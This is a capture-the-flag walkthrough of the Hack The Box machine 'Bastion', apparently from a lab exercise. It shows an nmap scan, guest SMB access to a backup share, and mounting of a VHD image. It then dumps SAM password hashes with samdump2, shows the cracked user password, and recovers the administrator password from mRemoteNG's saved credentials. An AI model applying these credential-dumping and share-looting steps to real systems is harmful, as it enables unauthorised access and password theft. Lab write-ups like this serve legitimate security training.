```# Nmap 7.70 scan initiated Sat May 11 21:25:37 2019 as: nmap -A -o nmap -v 10.10.10.134
Increasing send delay for 10.10.10.134 from 0 to 5 due to 133 out of 441 dropped probes since last increase.
Nmap scan report for 10.10.10.134
Host is up (0.15s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=5/11%OT=22%CT=1%CU=30999%PV=Y%DS=2%DC=T%G=Y%TM=5CD6F0B
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=105%TS=A)SEQ(SP=107%GCD=1%I
OS:SR=105%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=105%CI=I%II=I%TS=A)OPS(O1=M54DNW8S
OS:T11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54D
OS:ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=
OS:80%W=2000%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2
OS:(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%
OS:F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL
OS:=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Uptime guess: 0.096 days (since Sat May 11 19:08:29 2019)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -39m56s, deviation: 1h09m14s, median: 1s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-05-11T17:56:25+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-05-11 21:26:23
|_  start_date: 2019-05-11 19:08:52

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   148.76 ms 10.10.12.1
2   147.96 ms 10.10.10.134

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 11 21:26:32 2019 -- 1 IP address (1 host up) scanned in 54.72 seconds
```


```1- Port Scanning, Open Ports are 22, 139, 135, 445
All are the SMB's port, So I tried little bit enumeration like :
> nmap --script smb-vuln* -p 445 10.10.10.134
>  nmblookup -A 10.10.10.134
> smbmap -H 10.10.10.134
> echo exit | smbclient -L \\10.10.10.134 (Here I found something Interesting Backup directory :-) )

It is asking for root password and I just pressed enter it worked :-)

after some enumeration I found .vhd file (smbclient \\\\10.10.10.134\\Backups)
 (\\10.10.10.134\Backups\WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\ this is the path for vhd file)

with the help of google I figured out that we can mount it using "mount -t cifs //10.10.10.134/Backups /mnt/htb" Command.


install libvhdi-utils
To mount vhd locally read this article "https://nathan.vertile.com/blog/2015/02/27/mounting-a-vhd-ntfs-image-on-ubuntu/"




"/mnt/htb/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd"
"/mnt/htb/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd"

> vhdimount "/mnt/htb/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" /mnt/vhdi
> losetup -o $((128*512)) /dev/loop0 /mnt/vhdi/vhdi1
> mount -o ro,noload /dev/loop0 /mnt/backup

cd /mnt/backup/Windows/System32/config
samdump2 SYSTEM SAM 
Output :

*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::


Using Hash the killer site Password is "bureaulampje"

Login through ssh you will get user flag in Desktop.

Now After enumeration I found mRemoteNG in program (x86) folder, I search about it on google came to know that it stores passwords on confCons.xml then to decrypt it I installed the same tool on my windows machine and followed given steps.

"http://www.kayhankayihan.com/mremote-password-hash-crack/"

and finally I got the administrator password: thXLHM96BeKL0ER2

Use this password to login through ssh and go to Desktop and open root.txt.```



